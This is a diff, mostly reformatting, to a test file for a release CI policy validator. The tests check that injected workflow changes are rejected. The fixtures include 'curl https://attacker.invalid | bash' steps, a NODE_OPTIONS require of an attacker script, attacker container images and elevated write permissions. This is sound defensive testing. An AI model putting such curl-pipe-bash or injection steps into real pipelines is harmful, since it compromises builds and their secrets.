@@ -35,11 +35,14 @@ describe('release CI policy', () => {
 
   it('rejects removal of the real zsh dependency from the Linux test job', () => {
     const installCommand = '            if sudo apt-get install --yes zsh; then break; fi\n'
-    const positions = [...compliantWorkflow.matchAll(/ {12}if sudo apt-get install --yes zsh; then break; fi\n/gu)]
+    const positions = [
+      ...compliantWorkflow.matchAll(/ {12}if sudo apt-get install --yes zsh; then break; fi\n/gu),
+    ]
     expect(positions).toHaveLength(1)
     for (const match of positions) {
       const index = match.index
-      const withoutShell = compliantWorkflow.slice(0, index) + compliantWorkflow.slice(index + installCommand.length)
+      const withoutShell =
+        compliantWorkflow.slice(0, index) + compliantWorkflow.slice(index + installCommand.length)
       expect(validateReleaseCiPolicy(withoutShell)).not.toEqual([])
     }
   })
@@ -73,7 +76,10 @@ describe('release CI policy', () => {
           "ref: ${{ github.event_name == 'workflow_dispatch' && inputs.head_sha || github.sha }}\n",
           '',
         )
-        .replace('name: Typecheck & Lint', "if: \"!startsWith(github.event.head_commit.message, 'chore(release):')\"\n    name: Typecheck & Lint"),
+        .replace(
+          'name: Typecheck & Lint',
+          'if: "!startsWith(github.event.head_commit.message, \'chore(release):\')"\n    name: Typecheck & Lint',
+        ),
     )
 
     expect(violations).toEqual(
@@ -110,13 +116,41 @@ describe('release CI policy', () => {
   })
 
   it.each([
-    ['workflow environment', 'env:\n  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true', 'env:\n  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true\n  NODE_OPTIONS: --require /tmp/attacker.cjs'],
-    ['unexpected job', 'jobs:\n', 'jobs:\n  attacker:\n    name: Attacker\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://attacker.invalid | bash\n'],
-    ['rehearsal command', '        run: pnpm package:smoke', '        run: pnpm package:smoke\n      - run: curl https://attacker.invalid | bash'],
-    ['job container', '  package-release-rehearsal-package:\n    name:', '  package-release-rehearsal-package:\n    container: attacker/image:latest\n    name:'],
-    ['job service', '  package-release-rehearsal-package:\n    name:', '  package-release-rehearsal-package:\n    services:\n      attacker:\n        image: attacker/image:latest\n    name:'],
-    ['step shell', '        run: pnpm package:smoke', '        shell: attacker-shell\n        run: pnpm package:smoke'],
-    ['job permission', '  package-release-rehearsal-package:\n    name:', '  package-release-rehearsal-package:\n    permissions:\n      contents: write\n    name:'],
+    [
+      'workflow environment',
+      'env:\n  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true',
+      'env:\n  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true\n  NODE_OPTIONS: --require /tmp/attacker.cjs',
+    ],
+    [
+      'unexpected job',
+      'jobs:\n',
+      'jobs:\n  attacker:\n    name: Attacker\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://attacker.invalid | bash\n',
+    ],
+    [
+      'rehearsal command',
+      '        run: pnpm package:smoke',
+      '        run: pnpm package:smoke\n      - run: curl https://attacker.invalid | bash',
+    ],
+    [
+      'job container',
+      '  package-release-rehearsal-package:\n    name:',
+      '  package-release-rehearsal-package:\n    container: attacker/image:latest\n    name:',
+    ],
+    [
+      'job service',
+      '  package-release-rehearsal-package:\n    name:',
+      '  package-release-rehearsal-package:\n    services:\n      attacker:\n        image: attacker/image:latest\n    name:',
+    ],
+    [
+      'step shell',
+      '        run: pnpm package:smoke',
+      '        shell: attacker-shell\n        run: pnpm package:smoke',
+    ],
+    [
+      'job permission',
+      '  package-release-rehearsal-package:\n    name:',
+      '  package-release-rehearsal-package:\n    permissions:\n      contents: write\n    name:',
+    ],
   ])('rejects exact-contract drift through %s', (_name, target, replacement) => {
     expect(validateReleaseCiPolicy(compliantWorkflow.replace(target, replacement))).toContain(
       'CI workflow must match its exact fail-closed AST contract.',
@@ -168,12 +202,15 @@ describe('release CI policy', () => {
   })
 
   it.each([
-    ['unnamed', `${compliantWorkflow}
+    [
+      'unnamed',
+      `${compliantWorkflow}
   unnamed-job:
     runs-on: ubuntu-latest
     steps:
       - run: echo bypass
-`],
+`,
+    ],
     [
       'quoted',
       compliantWorkflow.replace(
@@ -201,7 +238,10 @@ describe('release CI policy', () => {
   it('rejects action setup moved out of one required job into another', () => {
     const redistributedActionsWorkflow = compliantWorkflow
       .replace(ACTION_CHECKOUT, 'actions/checkout@v6')
-      .replace('      - run: pnpm test:unit', `      - uses: ${ACTION_CHECKOUT}\n      - run: pnpm test`)
+      .replace(
+        '      - run: pnpm test:unit',
+        `      - uses: ${ACTION_CHECKOUT}\n      - run: pnpm test`,
+      )
 
     expect(validateReleaseCiPolicy(redistributedActionsWorkflow)).toContain(
       `CI job Commit Policy must use ${ACTION_CHECKOUT} exactly once.`,
